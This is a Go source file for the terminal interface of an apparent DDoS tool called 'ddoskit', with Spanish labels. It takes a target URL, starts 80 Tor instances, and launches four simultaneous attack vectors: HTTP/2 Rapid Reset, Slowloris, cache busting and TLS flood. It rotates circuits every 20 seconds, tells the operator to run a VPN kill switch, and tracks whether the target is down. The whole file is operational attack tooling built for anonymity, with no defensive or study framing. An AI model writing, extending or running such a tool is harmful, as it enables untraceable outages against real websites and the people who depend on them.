package ui

import (
	"ddoskit/pkg/attacks"
	"ddoskit/pkg/engine"
	"ddoskit/pkg/tor"
	"fmt"
	"net/http"
	"strings"
	"sync/atomic"
	"time"

	"github.com/gdamore/tcell/v2"
	"github.com/rivo/tview"
)

const logo = `  [red]██████╗ ██████╗  ██████╗ ███████╗██╗  ██╗██╗████████╗[-]
  [red]██╔══██╗██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██║╚══██╔══╝[-]
  [red]██║  ██║██║  ██║██║   ██║███████╗█████╔╝ ██║   ██║   [-]
  [red]██║  ██║██║  ██║██║   ██║╚════██║██╔═██╗ ██║   ██║   [-]
  [red]██████╔╝██████╔╝╚██████╔╝███████║██║  ██╗██║   ██║   [-]
  [red]╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝  [-]`

type App struct {
	tapp   *tview.Application
	torMgr *tor.Manager
	orch   *engine.Orchestrator
	stats  *attacks.Stats
}

func NewApp() *App {
	return &App{}
}

func (a *App) Cleanup() {
	if a.orch != nil {
		a.orch.Stop()
	}
	if a.torMgr != nil {
		a.torMgr.StopAll()
	}
}

func (a *App) Run() error {
	return a.showStartup()
}

// ─────────────────────────────────────────────
// PANTALLA 1: Startup + URL input
// ─────────────────────────────────────────────
func (a *App) showStartup() error {
	a.tapp = tview.NewApplication()

	// Warning box
	warning := tview.NewTextView().
		SetDynamicColors(true).
		SetText("\n  [yellow]⚠  Asegúrate de tener ProtonVPN activo con Kill Switch ON[white]\n\n" +
			"  [green]✓[white]  80 instancias Tor  |  4 vectores simultáneos\n" +
			"  [green]✓[white]  HTTP/2 Rapid Reset + Slowloris + Cache Bust + TLS Flood\n" +
			"  [green]✓[white]  Rotación automática cada 20 segundos\n")

	// URL input
	urlInput := tview.NewInputField().
		SetLabel("  Target URL: ").
		SetFieldBackgroundColor(tcell.ColorBlack).
		SetFieldTextColor(tcell.ColorGreen).
		SetLabelColor(tcell.ColorYellow).
		SetPlaceholder("https://ejemplo.com").
		SetPlaceholderTextColor(tcell.ColorDarkGray)

	urlInput.SetBorder(true).
		SetBorderColor(tcell.ColorYellow).
		SetTitle("  [ ENTER = lanzar ]  [ ESC = salir ]  ").
		SetTitleColor(tcell.ColorYellow)

	header := tview.NewTextView().
		SetDynamicColors(true).
		SetText("\n" + logo + "\n")

	flex := tview.NewFlex().
		SetDirection(tview.FlexRow).
		AddItem(header, 8, 0, false).
		AddItem(warning, 6, 0, false).
		AddItem(urlInput, 3, 0, true)

	a.tapp.SetRoot(flex, true).SetFocus(urlInput)

	var target string

	urlInput.SetDoneFunc(func(key tcell.Key) {
		if key != tcell.KeyEnter {
			return
		}
		t := strings.TrimSpace(urlInput.GetText())
		if t == "" {
			return
		}
		if !strings.HasPrefix(t, "http") {
			t = "https://" + t
		}
		target = t
		a.tapp.Stop()
	})

	a.tapp.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.tapp.Stop()
			return nil
		}
		return event
	})

	if err := a.tapp.Run(); err != nil {
		return err
	}

	if target == "" {
		return nil
	}

	return a.showLoading(target)
}

// ─────────────────────────────────────────────
// PANTALLA 2: Cargando Tor instances
// ─────────────────────────────────────────────
func (a *App) showLoading(target string) error {
	a.tapp = tview.NewApplication()

	info := tview.NewTextView().
		SetDynamicColors(true)

	flex := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(tview.NewTextView().SetDynamicColors(true).
			SetText("\n"+logo+"\n"), 8, 0, false).
		AddItem(info, 0, 1, false)

	a.tapp.SetRoot(flex, true)

	a.torMgr = tor.NewManager(80)
	var readyCount int64

	a.torMgr.OnReady = func(r, total int) {
		atomic.StoreInt64(&readyCount, int64(r))
		pct := r * 100 / total
		bar := strings.Repeat("█", pct/5) + strings.Repeat("░", 20-pct/5)
		a.tapp.QueueUpdateDraw(func() {
			info.Clear()
			fmt.Fprintf(info, "\n  [yellow]Iniciando instancias Tor...[white]\n\n")
			fmt.Fprintf(info, "  [green]%s[white]  %d/%d  (%d%%)\n\n", bar, r, total, pct)
			fmt.Fprintf(info, "  [gray]Esto toma ~45 segundos[white]\n")
		})
	}

	go func() {
		a.torMgr.Start()

		active := a.torMgr.ActiveCount()
		if active == 0 {
			a.tapp.QueueUpdateDraw(func() {
				info.Clear()
				fmt.Fprintf(info, "\n  [red]Error: ninguna instancia Tor arrancó[white]\n")
				fmt.Fprintf(info, "  [gray]Verifica que Tor esté instalado: which tor[white]\n")
			})
			return
		}

		orch, err := engine.New(target, a.torMgr)
		if err != nil {
			a.tapp.QueueUpdateDraw(func() {
				info.Clear()
				fmt.Fprintf(info, "\n  [red]Error: %v[white]\n", err)
			})
			return
		}
		a.orch = orch
		a.stats = orch.Stats
		a.tapp.Stop()
	}()

	if err := a.tapp.Run(); err != nil {
		return err
	}

	if a.orch == nil {
		return nil
	}

	return a.showDashboard(target)
}

// ─────────────────────────────────────────────
// PANTALLA 3: Dashboard en tiempo real
// ─────────────────────────────────────────────
func (a *App) showDashboard(target string) error {
	a.tapp = tview.NewApplication()

	dash := tview.NewTextView().
		SetDynamicColors(true)

	a.tapp.SetRoot(dash, true)
	a.orch.Start()

	start := time.Now()
	var prevTotal int64
	var rps int64
	rotateEvery := 20 * time.Second
	nextRotate := time.Now().Add(rotateEvery)
	torActive := a.torMgr.ActiveCount()
	var realStatus int32 // 0=checking 1=up 2=down
	atomic.StoreInt32(&realStatus, 0)

	go func() {
		client := &http.Client{Timeout: 5 * time.Second}
		for {
			resp, err := client.Get(target)
			if err != nil || resp.StatusCode >= 500 {
				atomic.StoreInt32(&realStatus, 2)
			} else {
				atomic.StoreInt32(&realStatus, 1)
				resp.Body.Close()
			}
			time.Sleep(10 * time.Second)
		}
	}()

	ticker := time.NewTicker(500 * time.Millisecond)
	go func() {
		for range ticker.C {
			rr, sl, cb, tf, total, errs := a.stats.Snapshot()
			elapsed := time.Since(start)

			if int(elapsed.Seconds())%2 == 0 {
				rps = (total - prevTotal) * 2
				prevTotal = total
			}

			remaining := time.Until(nextRotate)
			if remaining <= 0 {
				nextRotate = time.Now().Add(rotateEvery)
				remaining = rotateEvery
			}

			errPct := int64(0)
			if total > 0 {
				errPct = errs * 100 / total
			}

			rotPct := int(float64(rotateEvery-remaining) / float64(rotateEvery) * 20)
			rotBar := "[green]" + strings.Repeat("█", rotPct) + "[gray]" + strings.Repeat("░", 20-rotPct) + "[white]"
			status := atomic.LoadInt32(&realStatus)

			a.tapp.QueueUpdateDraw(func() {
				dash.Clear()

				fmt.Fprintf(dash, "\n%s\n\n", logo)
				fmt.Fprintf(dash, "  [yellow]Target:[white]  %s\n", target)
				fmt.Fprintf(dash, "  [green]VPN[white] ProtonVPN   [green]Tor[white] %d instancias   [gray]%s[white]\n\n",
					torActive, elapsed.Round(time.Second))

				fmt.Fprintf(dash, "  [yellow]%-18s  %-14s[white]\n", "Vector", "Requests")
				fmt.Fprintf(dash, "  %s\n", strings.Repeat("─", 36))
				fmt.Fprintf(dash, "  [cyan]%-18s[white]  [green]%s[white]\n", "HTTP/2 RapidReset", fmtNum(rr))
				fmt.Fprintf(dash, "  [cyan]%-18s[white]  [green]%s[white]\n", "Slowloris", fmtNum(sl))
				fmt.Fprintf(dash, "  [cyan]%-18s[white]  [green]%s[white]\n", "Cache Bust", fmtNum(cb))
				fmt.Fprintf(dash, "  [cyan]%-18s[white]  [green]%s[white]\n", "TLS Flood", fmtNum(tf))
				fmt.Fprintf(dash, "  %s\n", strings.Repeat("─", 36))
				fmt.Fprintf(dash, "  [white]%-18s  [yellow]%s[white]\n\n", "TOTAL", fmtNum(total))

				fmt.Fprintf(dash, "  [yellow]Req/s:[white]    ~%s\n", fmtNum(rps))
				fmt.Fprintf(dash, "  [yellow]Errores Tor:[white] %d%%\n", errPct)
				fmt.Fprintf(dash, "  [yellow]Servidor:[white]    %s\n\n", realServerState(status))
				fmt.Fprintf(dash, "  [yellow]Rotation:[white] %s  %ds\n\n", rotBar, int(remaining.Seconds()))
				fmt.Fprintf(dash, "  [gray]Q salir   R rotar ahora[white]\n")
			})
		}
	}()

	a.tapp.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		switch event.Rune() {
		case 'q', 'Q':
			ticker.Stop()
			a.orch.Stop()
			a.torMgr.StopAll()
			a.tapp.Stop()
		case 'r', 'R':
			a.torMgr.RotateAll()
			nextRotate = time.Now().Add(rotateEvery)
		}
		return event
	})

	return a.tapp.Run()
}

func fmtNum(n int64) string {
	switch {
	case n >= 1_000_000:
		return fmt.Sprintf("%.1fM", float64(n)/1_000_000)
	case n >= 1_000:
		return fmt.Sprintf("%.1fk", float64(n)/1_000)
	default:
		return fmt.Sprintf("%d", n)
	}
}

func realServerState(status int32) string {
	switch status {
	case 0:
		return "[gray]verificando...[white]"
	case 1:
		return "[green]EN PIE ✓[white]"
	case 2:
		return "[red]CAÍDO ✗[white]"
	default:
		return "[gray]desconocido[white]"
	}
}
